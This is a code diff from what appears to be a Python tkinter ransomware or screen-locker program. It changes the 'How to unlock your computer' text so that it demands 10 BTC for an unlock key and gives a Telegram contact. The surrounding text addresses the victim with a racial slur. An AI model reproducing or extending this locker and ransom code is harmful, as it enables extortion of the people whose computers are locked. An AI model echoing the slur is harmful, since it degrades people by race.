@@ -88,7 +88,8 @@ note_text.config(state=tk.DISABLED)
 
 steps_text = '''1. Take your black ass off the net
 2. Stop opening random files
-3. Nobody is giving you your password to unlock this PC'''
+3. Send me 10btc to gain the key to unlock your pc
+4. once sent contact me on telegram https://t.me/pyinstance'''
 steps_label = tk.Label(wind, text="How to unlock your computer:", bg="#2C3E50", fg="#ECF0F1", font=font_medium)
 steps_label.pack(pady=5)
 steps_text_widget = tk.Text(wind, height=5, width=60, bg="#34495E", fg="#ECF0F1", font=font_small, wrap=tk.WORD, bd=0)
